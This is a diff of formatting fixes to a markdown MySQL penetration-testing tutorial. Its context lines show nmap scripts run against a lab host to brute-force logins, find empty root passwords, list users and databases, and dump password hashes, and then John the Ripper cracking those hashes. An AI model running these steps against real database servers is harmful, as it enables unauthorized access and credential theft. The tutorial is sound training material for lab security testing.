@@ -19,7 +19,7 @@ Now type another command to retrieve MySQL information such as version, protocol
 
 ```
 nmap --script=mysql-info 192.168.1.216
-``````
+```
 ### Example....
 
 ```
@@ -52,6 +52,7 @@ Above command try to connect to with MySQL server and hence prints information s
 
 ┌──(parallels㉿kali-gnu-linux-2023)-[~]
 └─$ nmap -p3306 --script mysql-brute 192.168.10.170
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 08:33 EET
 Nmap scan report for 192.168.10.170
 Host is up (0.24s latency).
@@ -84,10 +85,12 @@ PORT     STATE SERVICE
 5900/tcp open  vnc
 
 Nmap done: 1 IP address (1 host up) scanned in 263.01 seconds
-                                                                                           ## Finding root accounts with an empty password in MySQL servers
+
+## Finding root accounts with an empty password in MySQL servers
                                                                                                                             
 ┌──(parallels㉿kali-gnu-linux-2023)-[~]
 └─$ nmap -p3306 --script mysql-empty-password 192.168.10.170 
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 08:56 EET
 Nmap scan report for 192.168.10.170
 Host is up (0.0086s latency).
@@ -101,6 +104,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
 
 ┌──(parallels㉿kali-gnu-linux-2023)-[~]
 └─$ nmap -p3306 --script mysql-users --script-args mysqluser=root,mysqlpass=root 192.168.10.170
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 09:58 EET
 Nmap scan report for 192.168.10.170
 Host is up (0.0046s latency).
@@ -140,6 +144,7 @@ This command will fetch MySQL database name which helps of given argument mysqlu
 ```
 ┌──(parallels㉿kali-gnu-linux-2023)-[~]
 └─$ nmap -p3306 192.168.10.170 --script=mysql-databases --script-args mysqluser=root,mysqlpass=root  
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 11:21 EET
 Nmap scan report for 192.168.10.170
 Host is up (0.12s latency).
@@ -204,6 +209,7 @@ This command will Dumps the password hashes from a MySQL server in a format suit
 ```
 ┌──(parallels㉿kali-gnu-linux-2023)-[~]
 └─$ nmap -p3306 192.168.10.170 --script=mysql-dump-hashes --script-args username=root,password=root
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 11:24 EET
 Nmap scan report for 192.168.10.170
 Host is up (0.011s latency).
@@ -235,6 +241,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
 
 ┌──(parallels㉿kali-gnu-linux-2023)-[~]
 └─$ john hashes.txt                               
+
 Using default input encoding: UTF-8
 Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 128/128 ASIMD 4x])
 Warning: no OpenMP support for this hash type, consider --fork=2
